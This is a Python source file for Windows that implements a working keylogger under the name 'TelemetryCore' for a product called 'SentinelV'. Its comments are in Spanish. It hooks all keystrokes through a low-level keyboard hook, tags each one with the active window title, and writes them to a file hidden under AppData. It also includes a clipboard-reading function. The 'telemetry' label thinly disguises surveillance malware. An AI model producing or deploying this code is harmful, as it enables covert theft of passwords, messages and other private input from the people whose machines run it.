
import ctypes
import ctypes.wintypes as wintypes
import logging
import threading
import time
from queue import Empty, Queue
from typing import Callable, Dict, Optional
from pathlib import Path

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("SentinelV.TelemetryCore")

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CF_UNICODETEXT = 13

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

try:
    LRESULT = wintypes.LRESULT
except AttributeError:
    LRESULT = ctypes.c_long

HOOKPROC = ctypes.WINFUNCTYPE(
    LRESULT,
    ctypes.c_int,
    wintypes.WPARAM,
    wintypes.LPARAM,
)


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
    ]


class TelemetryCore:
    """Módulo de ingesta que usa un patrón Producer-Consumer para keylogging."""

    def __init__(self, batch_callback: Optional[Callable[[str], None]] = None) -> None:
        self._queue: Queue[str] = Queue()
        self._activity_queue: Queue[str] = Queue()
        self._batch_callback = batch_callback
        self._stop_event = threading.Event()
        self._consumer_thread: Optional[threading.Thread] = None
        self._activity_thread: Optional[threading.Thread] = None
        self._hook_thread: Optional[threading.Thread] = None
        self._hook_proc: Optional[HOOKPROC] = None
        self._hook_id = None
        self._last_window_handle: Optional[int] = None
        self._last_window_title: str = ""
        self._activity_log_path = Path.home() / "AppData" / "Local" / "SentinelV" / "user_activity.txt"
        self._activity_log_path.parent.mkdir(parents=True, exist_ok=True)

    def start(self) -> None:
        """Arranca el hook y el consumidor de la cola en segundo plano."""
        logger.info("Iniciando TelemetryCore")
        self._consumer_thread = threading.Thread(target=self._consumer_loop, daemon=True)
        self._consumer_thread.start()
        self._activity_thread = threading.Thread(target=self._activity_writer_loop, daemon=True)
        self._activity_thread.start()
        self._hook_thread = threading.Thread(target=self._install_keyboard_hook, daemon=True)
        self._hook_thread.start()

    def stop(self) -> None:
        """Detiene el hook y ordena el cierre del hilo de consumo."""
        logger.info("Deteniendo TelemetryCore")
        self._stop_event.set()
        if self._hook_id:
            user32.UnhookWindowsHookEx(self._hook_id)
            self._hook_id = None
        if self._consumer_thread:
            self._consumer_thread.join(timeout=2.0)
        if self._activity_thread:
            self._activity_thread.join(timeout=2.0)

    def _install_keyboard_hook(self) -> None:
        """Intenta instalar un hook de teclado de bajo nivel y, si falla, entra en modo limitado."""
        try:
            self._hook_proc = HOOKPROC(self._low_level_keyboard_proc)
            self._hook_id = user32.SetWindowsHookExW(
                WH_KEYBOARD_LL,
                self._hook_proc,
                kernel32.GetModuleHandleW(None),
                0,
            )
            if not self._hook_id:
                logger.warning("No se pudo instalar el hook de teclado. Operando en modo de privilegios limitados.")
                return
            logger.info("Hook de teclado instalado con ID %s", self._hook_id)
            self._message_loop()
        except Exception as exc:
            logger.warning("Fallo al instalar hook de teclado: %s. Operando en modo limitado.", exc)

    def _message_loop(self) -> None:
        """Mantiene viva la cola de mensajes para el hook sin bloquear la CPU."""
        msg = wintypes.MSG()
        while not self._stop_event.is_set():
            if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1):
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))
            else:
                time.sleep(0.01)

    def _low_level_keyboard_proc(
        self,
        nCode: int,
        wParam: wintypes.WPARAM,
        lParam: wintypes.LPARAM,
    ) -> LRESULT:
        """Callback del hook que envía eventos normalizados a la cola."""
        if nCode == 0 and wParam == WM_KEYDOWN:
            kb_struct = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
            key = self._normalize_key(kb_struct.vkCode)
            context = self._window_context()
            payload = f"{context} | {key}"
            try:
                self._queue.put_nowait(payload)
                self._activity_queue.put_nowait(payload)
            except Exception as exc:
                logger.warning("Error al encolar evento de teclado: %s", exc)

        return user32.CallNextHookEx(self._hook_id, nCode, wParam, lParam)

    def _normalize_key(self, vk_code: int) -> str:
        """Mapea códigos virtuales a representaciones legibles de teclas."""
        lookup: Dict[int, str] = {
            0x08: "BACKSPACE",
            0x09: "TAB",
            0x0D: "ENTER",
            0x10: "SHIFT",
            0x11: "CONTROL",
            0x12: "ALT",
            0x1B: "ESCAPE",
            0x20: "SPACE",
            0x2E: "DELETE",
        }
        if 0x30 <= vk_code <= 0x39:
            return chr(vk_code)
        if 0x41 <= vk_code <= 0x5A:
            return chr(vk_code)
        return lookup.get(vk_code, f"VK_{vk_code}")

    def capture_clipboard(self) -> str:
        """Lee el portapapeles de Windows de forma segura para telemetría adicional."""
        try:
            if user32.OpenClipboard(None):
                handle = user32.GetClipboardData(CF_UNICODETEXT)
                if handle:
                    ptr = kernel32.GlobalLock(handle)
                    if ptr:
                        text = ctypes.wstring_at(ptr)
                        kernel32.GlobalUnlock(handle)
                        user32.CloseClipboard()
                        return text
                user32.CloseClipboard()
        except Exception as exc:
            logger.debug("Fallo al capturar el portapapeles: %s", exc)
        return ""

    def _window_context(self) -> str:
        """Obtiene el título de la ventana activa con mínimo gasto de API."""
        handle = user32.GetForegroundWindow()
        if handle == self._last_window_handle:
            return self._last_window_title

        buffer = ctypes.create_unicode_buffer(512)
        user32.GetWindowTextW(handle, buffer, 512)
        title = buffer.value or "<sin título>"
        self._last_window_handle = handle
        self._last_window_title = title
        return title

    def _consumer_loop(self) -> None:
        """Consume la cola y delega el procesamiento de cada evento."""
        while not self._stop_event.is_set():
            try:
                event = self._queue.get(timeout=0.5)
                self._process_event(event)

            except Empty:
                continue
            except Exception as exc:
                logger.exception("Error en el consumidor de telemetría: %s", exc)

    def _activity_writer_loop(self) -> None:
        """Escribe de forma persistente los eventos de teclado en un archivo de auditoría."""
        while not self._stop_event.is_set():
            try:
                line = self._activity_queue.get(timeout=0.5)
                try:
                    with open(self._activity_log_path, "a", encoding="utf-8") as log_file:
                        log_file.write(f"{line}\n")
                except Exception as exc:
                    logger.warning("No se pudo escribir user_activity.txt: %s", exc)
            except Empty:
                continue
            except Exception as exc:
                logger.exception("Error en el hilo de actividad de usuario: %s", exc)

    def _process_event(self, event: str) -> None:
        """Procesa y entrega el evento a quien lo consuma."""
        if self._batch_callback:
            self._batch_callback(event)
        else:
            logger.debug("Evento capturado: %s", event)


if __name__ == "__main__":
    def print_event(data: str) -> None:
        print(data)

    core = TelemetryCore(batch_callback=print_event)
    try:
        core.start()
    except KeyboardInterrupt:
        core.stop()
